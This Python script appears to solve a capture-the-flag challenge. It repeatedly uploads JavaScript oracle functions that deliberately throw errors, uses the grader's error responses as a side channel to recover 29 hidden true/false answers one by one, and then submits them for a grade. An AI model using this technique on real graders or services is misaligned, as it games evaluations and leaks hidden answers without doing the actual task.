import requests

url_base = 'https://autoraider-bvel4oasra-uc.a.run.app/'

s = requests.Session()

def upload_code(code):
    return s.post(url_base + 'upload', {'code': code}).text

def make_answer_str(answers):
    return '[' + ','.join(answers) + ']';

answers = []
# Do from question 0 to question 28
for i in range(29):
    answers_str = make_answer_str(answers);
    code = 'function oracle(p,q) { answers = ' + answers_str + '; if(q < answers.length) { return answers[q] } else if(q === answers.length) { return false } else { return a } }';
    res = upload_code(code);
    # If grader reached our error, our assumption that the last answer was false is correct
    # Otherwise, the last answer was actually true
    answers.append('false' if 'error' in res else 'true');

# Use edge case (which we know the answer to) to figure out question 29
answers_str = make_answer_str(answers);
res = upload_code('function oracle(p,q) { answers = ' + answers_str + '; if(p > 7754000) { return a } else if(q < answers.length) { return answers[q] } else { return false } }');
answers.append('false' if 'error' in res else 'true');

# Upload solution
answers_str = make_answer_str(answers);
upload_code('function oracle(p,q) { answers = ' + answers_str + '; if(p > 7754000) { return false } else { return answers[q] } }');
print(s.get(url_base + 'grade').text)